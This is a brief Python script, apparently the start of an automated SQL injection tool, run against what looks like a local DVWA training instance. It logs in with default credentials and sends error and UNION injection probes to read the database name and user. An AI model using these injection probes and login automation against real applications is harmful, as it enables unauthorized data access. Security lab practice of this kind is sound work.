import re
import requests

BASE = "http://localhost"

s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AutoSQLi/dev"})

# 1. fetch login page (get PHPSESSID + user_token)
r = s.get(f"{BASE}/login.php", timeout=10)
token = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)", r.text)
print("login page:", r.status_code, "token:", bool(token))

# 2. login
r = s.post(
    f"{BASE}/login.php",
    data={"username": "admin", "password": "password", "Login": "Login", "user_token": token.group(1) if token else ""},
    timeout=10,
)
print("after login:", r.status_code, "cookies:", dict(s.cookies))

# 3. sqli page baseline
r = s.get(f"{BASE}/vulnerabilities/sqli/?id=1&Submit=Submit", timeout=10)
print("sqli baseline:", r.status_code, "len:", len(r.text), "has 'admin':", "admin" in r.text)

# 4. error probe
r = s.get(f"{BASE}/vulnerabilities/sqli/", params={"id": "1'", "Submit": "Submit"}, timeout=10)
print("error probe:", r.status_code, "len:", len(r.text))
m = re.findall(r"(MySQL.*?<br|syntax.*?<br|Warning.*?<br)", r.text)
print("error text:", m[:3])

# 5. union probe
r = s.get(f"{BASE}/vulnerabilities/sqli/", params={"id": "1' union select database(),user()#", "Submit": "Submit"}, timeout=10)
print("union probe:", r.status_code, "len:", len(r.text), "dvwa in body:", "dvwa" in r.text.lower())
for name in ("ID:", "First name", "Surname"):
    print(name, name in r.text)
